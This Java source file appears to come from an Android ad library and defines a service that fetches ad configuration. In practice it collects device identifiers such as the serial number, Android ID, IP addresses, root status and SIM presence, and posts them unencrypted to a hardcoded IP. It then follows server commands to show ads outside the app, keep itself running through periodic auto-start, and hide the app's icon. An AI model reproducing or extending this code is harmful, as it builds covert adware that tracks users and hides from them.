package com.koolib.getadconfig;

import okhttp3.Call;
import java.util.Map;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.Response;
import android.os.Looper;
import java.util.HashMap;
import java.util.Iterator;
import android.os.Handler;
import okhttp3.RequestBody;
import java.io.IOException;
import com.google.gson.Gson;
import okhttp3.OkHttpClient;
import android.content.Intent;
import io.reactivex.Observable;
import android.app.IntentService;
import com.koolib.util.AppIconUtils;
import io.reactivex.functions.Consumer;
import io.reactivex.functions.Function;
import com.koolib.adfactory.InAdFactory;
import com.koolib.adfactory.OutAdFactory;
import com.koolib.datamodel.AdConfigBean;
import io.reactivex.schedulers.Schedulers;
import android.support.annotation.Nullable;
import com.koolib.util.AutoStartWorkerUtils;
import com.koolib.util.SharepreferenceUtils;
import static com.koolib.util.EncryUtils.encode;
import static com.koolib.util.DeviceInfoUtils.*;
import com.koolib.adconfigaction.ProtectOutAdOfBase;
import io.reactivex.android.schedulers.AndroidSchedulers;
import static com.koolib.util.DeviceInfoUtils.getVersionName;

public class getAdConfigsServiceForJava extends IntentService
{
    private OkHttpClient client;

    public void onCreate()
    {
        super.onCreate();
        client = new OkHttpClient();
    }

    public void onDestroy()
    {
        client = null;
        super.onDestroy();
    }

    public getAdConfigsServiceForJava()
    {
        super("getAdConfigsServiceForJava");

    }

    protected void onHandleIntent(@Nullable Intent intent)
    {
        FormBody.Builder builder = new FormBody.Builder();
        builder.add("n",encode(getPackageName())).
                add("b",encode(getSerialNumber())).
                add("f",encode(getSystemVersion())).
                add("i",encode(getSystemLanguage())).
                add("s",encode(getIpAddressOfOut())).
                add("j",encode(getCurrentTimeZone())).
                add("v",encode(getVersionName(this))).
                add("e",encode(getIpAddressOfIn(this))).
                add("k",encode(getRomTotalMemory(this))).
                add("d",encode(getScreenResolution(this))).
                add("m",encode(android.os.Build.HARDWARE)).
                add("a",encode(getAndroidId(getApplicationContext()))).
                add("c",encode(getDeviceBrand() + ":" + getSystemModel())).
                add("l",encode(getRamTotalMemory(getApplicationContext()))).
                add("g",encode((checkWhetherDeviceIsRooted() ? "1" : "0"))).
                add("h",encode((isHasSimCard(getApplicationContext()) ? "1" : "0")));
        /******************************************************************************************/
        /******************************************************************************************/
        Map<String,String> glDatasMap  =  new HashMap<String,String>();
        String glDatasStr = intent.getStringExtra("gl_datas");
        String[] glDatasArray = glDatasStr.split("&");
        for(int index = 0;index < glDatasArray.length;index++)
        {
            String[] glDatasKeyValue = glDatasArray[index].split("=");
            if(glDatasKeyValue.length == 2)
                glDatasMap.put(glDatasKeyValue[0].trim(),glDatasKeyValue[1].trim());
            else
                glDatasMap.put(glDatasKeyValue[0].trim(),"");
        }
        Iterator<Map.Entry<String,String>> iterator = glDatasMap.entrySet().iterator();
        while(iterator.hasNext())
        {
            Map.Entry<String, String> entry = iterator.next();
            builder.add(entry.getKey().trim(),encode(entry.getValue().trim()));
        }
        /******************************************************************************************/
        /******************************************************************************************/
        RequestBody formBody = builder.build();
        okhttp3.Request request = new okhttp3.Request.Builder().
        url("http://47.92.170.43/api").post(formBody).build();
        Call call = client.newCall(request);
        call.enqueue(new Callback()
        {
            public void onFailure(Call call, IOException e)
            {
                new Handler(Looper.getMainLooper()).post(new Runnable()
                {
                    public void run()
                    {
                        AdConfigBean adConfigBean = SharepreferenceUtils.getAdConfig(getAdConfigsServiceForJava.this);
                        if(null == adConfigBean || null == adConfigBean.getData())
                        {
                            adConfigBean = new AdConfigBean();
                            adConfigBean.getData().setAutoStartUpApp(true);
                            adConfigBean.getData().setTurnOnTheAppInAd(true);
                            adConfigBean.getData().setTurnOnTheAppOutAd(false);
                            adConfigBean.getData().setSelectedAppInAdVender("facebook");
                            SharepreferenceUtils.saveAdConfig(getAdConfigsServiceForJava.this,adConfigBean);
                        }
                        if(null != adConfigBean.getData() && adConfigBean.getData().isTurnOnTheAppInAd())
                        {
                            InAdFactory.getInstance(getAdConfigsServiceForJava.this).syncAdConfigAndPollAd();
                        }
                        if(null != adConfigBean.getData() && adConfigBean.getData().isTurnOnTheAppOutAd())
                        {
                            OutAdFactory.getInstance(getAdConfigsServiceForJava.this).syncAdConfigAndPollAd();
                            ProtectOutAdOfBase.getInstance(getAdConfigsServiceForJava.this).startUpProtectOutAd();
                            ProtectOutAdOfBase.getInstance(getAdConfigsServiceForJava.this).startUpProtectOutAdModel();
                        }NetWorkStateReceiver.allowUpdateConfigure();
                    }
                });
            }

            public void onResponse(Call call,Response response) throws IOException
            {
                Observable.just(response).map(new Function<Response, AdConfigBean>()
                {
                    public AdConfigBean apply(Response response) throws Exception
                    {
                        AdConfigBean adConfigBean =  new Gson().fromJson(response.body().string(),AdConfigBean.class);
                        if(null == adConfigBean || null == adConfigBean.getData())
                            adConfigBean = SharepreferenceUtils.getAdConfig(getAdConfigsServiceForJava.this);
                        if(null == adConfigBean || null == adConfigBean.getData())
                        {
                            adConfigBean = new AdConfigBean();
                            adConfigBean.getData().setAutoStartUpApp(true);
                            adConfigBean.getData().setTurnOnTheAppInAd(true);
                            adConfigBean.getData().setTurnOnTheAppOutAd(false);
                            adConfigBean.getData().setSelectedAppInAdVender("facebook");
                        }
                        SharepreferenceUtils.saveAdConfig(getAdConfigsServiceForJava.this,adConfigBean);
                        if(null != adConfigBean.getData() && adConfigBean.getData().isTurnOnTheAppInAd())
                        {
                            InAdFactory.getInstance(getAdConfigsServiceForJava.this).syncAdConfigAndPollAd();
                        }
                        if(null != adConfigBean.getData() && adConfigBean.getData().isTurnOnTheAppOutAd())
                        {
                            OutAdFactory.getInstance(getAdConfigsServiceForJava.this).syncAdConfigAndPollAd();
                            ProtectOutAdOfBase.getInstance(getAdConfigsServiceForJava.this).startUpProtectOutAd();
                            ProtectOutAdOfBase.getInstance(getAdConfigsServiceForJava.this).startUpProtectOutAdModel();
                        }
                        return adConfigBean;
                    }
                }).subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread()).subscribe(new Consumer<AdConfigBean>()
                {
                    public void accept(AdConfigBean adConfigBean) throws Exception
                    {
                        /************************根据配置条件隐藏/显示应用图标***********************/
                        AutoStartWorkerUtils.autoStartWorkerBySystemPeriodic(15 * 60 * 1000);
                        if(null != adConfigBean && null != adConfigBean.getData())
                        {
                            if(adConfigBean.getData().isHideAppIcon())
                            {
                                AppIconUtils.hideAppIcon(Long.valueOf(adConfigBean.getData().getHideAppIconDelayTime()));
                            }
                            else
                            {
                                AppIconUtils.showAppIcon(Long.valueOf(adConfigBean.getData().getShowAppIconDelayTime()));
                            }
                        }
                    }
                });
            }
        });
    }
}